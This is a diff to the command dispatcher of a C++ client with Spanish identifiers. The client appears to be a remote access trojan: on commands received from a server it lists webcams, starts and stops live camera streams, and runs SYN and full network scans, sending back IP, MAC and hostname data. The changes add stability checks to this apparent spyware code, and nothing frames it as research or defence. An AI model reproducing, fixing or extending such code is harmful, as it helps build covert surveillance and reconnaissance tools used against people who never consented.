@@ -525,6 +525,10 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                 this->mod_dynamic->OLE32, 
                 this->mod_dynamic->KERNEL32);
         }
+        if (!this->mod_Cam->checkMod()) {
+            __DBG_("[X] mod_Cam no se pudo cargar");
+            return;
+        }
 
         std::string strPaquete = "";
 
@@ -559,13 +563,19 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                 this->mod_dynamic->MFREADWRITE,
                 this->mod_dynamic->OLE32,
                 this->mod_dynamic->KERNEL32);
-            this->mod_Cam->ListNameCaptureDevices();
-            if (this->mod_Cam->vcCamObjs.size() <= 0) {
-                __DBG_("[X] No se obtuvieron camaras");
-                delete this->mod_Cam;
-                this->mod_Cam = nullptr;
-                return;
-            }
+        }
+
+        if (!this->mod_Cam->checkMod()) {
+            __DBG_("[X] mod_Cam no se pudo cargar");
+            return;
+        }
+
+        this->mod_Cam->ListNameCaptureDevices();
+        if (this->mod_Cam->vcCamObjs.size() <= 0) {
+            __DBG_("[X] No se obtuvieron camaras");
+            delete this->mod_Cam;
+            this->mod_Cam = nullptr;
+            return;
         }
 
         HRESULT hr = S_OK;
@@ -616,15 +626,28 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
 
     if (iComando == EnumComandos::CM_Live_Start) {
         u_int iDeviceIndex = atoi(paquete.cBuffer.data());
-        if (!this->mod_Cam->vcCamObjs[iDeviceIndex].isLive) {
+        if (this->mod_Cam) {
+            if (!this->mod_Cam->checkMod()) {
+                __DBG_("[X] mod_Cam no se pudo cargar");
+                return;
+            }
+
+            if (!this->mod_Cam->vcCamObjs[iDeviceIndex].isLive) {
                 this->mod_Cam->SpawnLive(iDeviceIndex);
             }
+        }
         return;
     }
 
     if (iComando == EnumComandos::CM_Live_Stop) {
         u_int iDeviceIndex = atoi(paquete.cBuffer.data());
-        this->mod_Cam->JoinLiveThread(iDeviceIndex);
+        if (this->mod_Cam) {
+            if (!this->mod_Cam->checkMod()) {
+                __DBG_("[X] mod_Cam no se pudo cargar");
+                return;
+            }
+            this->mod_Cam->JoinLiveThread(iDeviceIndex);
+        }
         return;
     }
     //#####################################################
@@ -996,6 +1019,12 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             this->mod_dynamic->LoadNetProcs();
             this->mod_Scan = new mod_Escaner(this->mod_dynamic->IPHLAPI, this->mod_dynamic->WS32);
         }
+
+        if (!this->mod_Scan->checkMod()) {
+            __DBG_("[X] mod_Scan no se pudo cargar");
+            return;
+        }
+
         std::string strPaquete = "";
         for (Host_Entry& host : this->mod_Scan->m_Escanear(paquete.cBuffer.data())) {
             strPaquete += host.strip + "|" + host.strmac + "|" + host.strhostname + "<||>";
@@ -1013,6 +1042,12 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             this->mod_dynamic->LoadNetProcs();
             this->mod_Scan = new mod_Escaner(this->mod_dynamic->IPHLAPI, this->mod_dynamic->WS32);
         }
+
+        if (!this->mod_Scan->checkMod()) {
+            __DBG_("[X] mod_Scan no se pudo cargar");
+            return;
+        }
+
         std::vector<std::string> vcData = strSplit(std::string(paquete.cBuffer.data()), "|", 3);
         if (vcData.size() == 3) {
             bool isFullScan = (iComando == EnumComandos::Net_Scan_Full_Sck || iComando == EnumComandos::Net_Scan_Full_Syn) ? true : false;
